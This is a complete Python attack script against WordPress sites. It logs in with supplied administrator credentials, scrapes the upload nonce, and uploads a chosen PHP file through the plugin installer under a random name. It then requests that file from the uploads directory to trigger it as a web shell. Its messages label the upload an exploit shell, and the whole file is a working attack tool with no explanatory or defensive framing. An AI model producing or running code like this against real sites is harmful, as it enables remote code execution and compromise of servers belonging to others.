import requests
import string
import random
import re
import io
from requests_toolbelt.multipart.encoder import MultipartEncoder
from datetime import datetime
import sys
import bs4

def login(username,password,link):
    domain = link.split('/')[2]
    url = link + '/wp-login.php'
    data = 'log={}&pwd={}&wp-submit=Log+In'.format(username,password)
    headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", 
    "Connection": "close", 
    "Prefer": "safe", 
    "Host": domain, 
    "Accept-Encoding": "gzip, deflate", 
    "Upgrade-Insecure-Requests": "1", 
    "Accept-Language": "en-US,en;q=0.5", 
    "Content-Type": "application/x-www-form-urlencoded"
    }
    s = requests.session()
    r = s.post(url,data = data, headers = headers)
    test2(r)
    if r.status_code == 200:
        print('Login as {}'.format(username))
    else:
        print('something went wrong')
        sys.exit(2)
    return s,domain

def wpnonce(data):
  search = '"_wpnonce" value="'
  string = io.StringIO(data.text).read()
  start = re.search(search,string).span()[1]
  key = ''
  while True:
    if string[start] != '"':
      key += string[start]
    else:
      break
    start += 1
  return key

def get_name():
    length = 10
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def get_wpnonce(s,link):
    url = link + '/wp-admin/plugin-install.php'
    r = s.get(url)
    if r.status_code != 200:
        print('Something Went Wrong... {}/wp-admin/plugin-install.php responsed {}'.format(link,r.status_code))
        sys.exit(2)
    wp = wpnonce(r)
    return s,wp

def shell_call(link,filename):
    month = '{:02d}'.format(datetime.now().month)
    year  = datetime.now().year
    url = link + '/wp-content/uploads/{}/{}/{}'.format(year,month,filename)
    try:
        r = requests.get(url,timeout=10)
    except requests.exceptions.ReadTimeout:
        print('')

def wp_http_referer(link,domain):
    start = re.search(domain,link).span()[1]
    if len(link[start:]) == 0:
        return '/wp-admin/plugin-install.php?tab=upload'
    else:
        return link[start:] + '/wp-admin/plugin-install.php?tab=upload'

def upload(s,wp,domain,link,file):
    url = link + '/wp-admin/update.php?action=upload-plugin'
    filename = get_name() + '.php'
    print('Exploit Shell Name : {}'.format(filename))
    content = open(file,'rb')
    payload = MultipartEncoder(fields={"_wpnonce" : wp, "_wp_http_referer":wp_http_referer(link,domain),'pluginzip':(filename,content,'application/octet-stream'),"install-plugin-submit":'Install Now'})
    headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", 
    "Referer": link + "/testsite/wp-admin/plugin-install.php", 
    "Connection": "close", 
    "Prefer": "safe", 
    "Host": domain, 
    "Accept-Encoding": "gzip, deflate", 
    "Upgrade-Insecure-Requests": "1", 
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": payload.content_type
    }
    r = s.post(url,data=payload,headers=headers,stream=True)
    test3(r)
    return filename
    
def commands(file,username,password,link):
    session,domain = login(username,password,link)
    session,wp = get_wpnonce(session,link)
    filename = upload(session,wp,domain,link,file)
    shell_call(link,filename)

def test(url):
    r = requests.get(url + '/wp-admin')
    if r.status_code != 200:
        print('Look Like it\'s not a WordPress Site')
        sys.exit(2)
    else:
        print("Login page Found")

def test2(r):
    html = bs4.BeautifulSoup(r.text,'lxml')
    if 'Log In' in html.title.text:
        print("Check the Credentials")
        sys.exit(2)

def test3(r):
    html = bs4.BeautifulSoup(r.text,'lxml')
    if 'Upload Plugin' not in html.title.text:
        print('Exploit Might Not work.. but still trying\nCheck your php exploit')
    else:
        print('Exploited Php Plugin Uploded...')
   
link = str(input("Enter the Url : "))
if link[-1] == '/':
    link = link[:-1]
test(link)
username = str(input("Enter the UserName : "))
if len(username) <= 0:
    print("UserName Cannot be Empty : ")
    sys.exit(2)
password = str(input("Enter the PassWord : "))
if len(password) <= 0:
    print("PassWord Cannot be Empty")
    sys.exit(2)
file = str(input("Enter the Php Plugin Exploit : "))
commands(file,username,password,link)